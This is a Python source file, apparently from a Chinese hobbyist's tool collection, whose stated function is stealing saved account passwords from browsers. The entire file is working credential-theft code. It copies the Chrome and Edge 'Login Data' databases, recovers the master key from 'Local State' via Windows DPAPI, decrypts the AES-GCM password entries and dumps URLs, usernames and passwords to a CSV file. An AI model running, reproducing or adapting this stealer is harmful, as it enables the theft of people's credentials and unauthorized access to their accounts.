'''
Function:
    盗取浏览器里的账号密码
Author:
    Charles
微信公众号:
    Charles的皮卡丘
'''
import os
import csv
import json
import shutil
import base64
import sqlite3


'''盗取浏览器里的账号密码'''
class DecryptBrowser():
    tool_name = '盗取浏览器里的账号密码'
    def __init__(self, savename='results.csv'):
        self.csv_heads = ['url', 'username', 'password']
        self.write_heads_flag = False
        self.savename = savename
    '''运行'''
    def run(self):
        self.fetch()
    '''获取数据库的数据'''
    def fetch(self):
        # Chrome浏览器
        if os.path.isfile(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'):
            print('[INFO]: 正在获取Chrome浏览器中的敏感数据')
            target_db_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Default\Login Data'
            shutil.copy2(target_db_path, 'temp')
            self.readdb('temp', self.getmasterkey(r'AppData\Local\Google\Chrome\User Data\Local State'))
            self.delfile('temp')
            print(f'[INFO]: 获取Chrome浏览器中的敏感数据成功, 数据保存在{self.savename}')
        # Edge浏览器
        if os.path.isfile(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State'):
            print('[INFO]: 正在获取Edge浏览器中的敏感数据')
            target_db_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
            shutil.copy2(target_db_path, 'temp')
            self.readdb('temp', self.getmasterkey(r'AppData\Local\Microsoft\Edge\User Data\Local State'))
            self.delfile('temp')
            print(f'[INFO]: 获取Edge浏览器中的敏感数据成功, 数据保存在{self.savename}')
    '''读取数据库数据'''
    def readdb(self, dbpath, master_key):
        sql = 'SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins;'
        client = sqlite3.connect(dbpath)
        cursor = client.cursor()
        with open(self.savename, 'a', newline='', encoding='utf-8-sig') as csv_file:
            cursor.execute(sql)
            csv_writer = csv.writer(csv_file, dialect=('excel'))
            if not self.write_heads_flag:
                csv_writer.writerow(self.csv_heads)
                self.write_heads_flag = True
            info = []
            for row in cursor.fetchall():
                for idx in range(len(self.csv_heads)):
                    if isinstance(row[idx], bytes):
                        info.append(self.decrypt(row[idx], master_key))
                    else:
                        info.append(row[idx])
                csv_writer.writerow(info)
                info = []
        cursor.close()
        client.close()
    '''删除文件'''
    def delfile(self, filename='temp'):
        try:
            os.remove('temp')
        except:
            pass
    '''解码'''
    def decrypt(self, value, master_key):
        if value[:3] == b'v10':
            from Crypto.Cipher import AES
            iv, payload = value[3:15], value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_value = cipher.decrypt(payload)
            decrypted_value = decrypted_value[:-16].decode()
        else:
            import win32crypt
            decrypted_value = win32crypt.CryptUnprotectData(value)[1].decode()
        return decrypted_value
    '''获得master key'''
    def getmasterkey(self, local_state_path):
        import win32crypt
        with open(os.environ['USERPROFILE'] + os.sep + local_state_path, 'r', encoding='utf-8') as fp:
            local_state = fp.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key